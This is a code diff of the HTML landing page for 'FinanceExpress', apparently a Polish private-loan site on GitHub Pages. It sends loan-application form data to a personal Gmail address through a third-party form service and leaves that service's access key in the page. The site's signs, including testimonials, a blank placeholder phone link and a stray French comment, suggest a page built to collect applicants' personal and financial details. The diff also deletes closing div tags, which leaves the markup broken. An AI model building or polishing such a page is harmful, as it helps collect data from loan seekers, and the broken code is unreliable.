@@ -199,11 +199,12 @@
                 </div>
                 <div class="hero-form-container">
                     <h3 style="text-align: center; margin-bottom: 24px; font-size: 1.5rem;">Wypełnij wniosek</h3>
-                    <form action="https://formsubmit.co/noreply.kontakt.pl@gmail.com" method="POST">
-                        <input type="hidden" name="_subject" value="NOWY WNIOSEK - FinanceExpress">
-                        <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_template" value="table">
-                        <input type="hidden" name="_next" value="https://monika-sourc.github.io/Szybka-po-yczka-prywatna/dziekuje.html">
+                    <!-- WEB3FORMS AVEC TA CLÉ + TON EMAIL noreply.kontakt.pl@gmail.com -->
+                    <form action="https://api.web3forms.com/submit" method="POST">
+                        <input type="hidden" name="access_key" value="65819dc2-b965-4f78-9c39-e284be207cf6">
+                        <input type="hidden" name="to_email" value="noreply.kontakt.pl@gmail.com">
+                        <input type="hidden" name="subject" value="NOWY WNIOSEK - FinanceExpress">
+                        <input type="hidden" name="redirect" value="https://monika-sourc.github.io/Szybka-po-yczka-prywatna/dziekuje.html">
                         
                         <div class="form-grid">
                             <div class="form-group">
@@ -354,7 +355,6 @@
                             <div>
                                 <div class="testimonial-author">Piotr W. <span>Kraków</span></div>
                             </div>
-                        </div>
                         <div class="testimonial-stars">
                             <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
                         </div>
@@ -440,11 +440,10 @@
                 <div class="footer-col">
                     <h4>Kontakt</h4>
                     <ul>
-                        <li><a href="mailto: noreply.kontakt.pl@gmail.com">noreply.kontakt.pl@gmail.com</a></li>
+                        <li><a href="mailto:noreply.kontakt.pl@gmail.com">noreply.kontakt.pl@gmail.com</a></li>
                         <li><a href="tel:+48123456789"></a></li>
                     </ul>
                 </div>
-            </div>
             <div class="footer-bottom">
                 <p>&copy; 2026 FinanceExpress. Wszelkie prawa zastrzeżone.</p>
             </div>
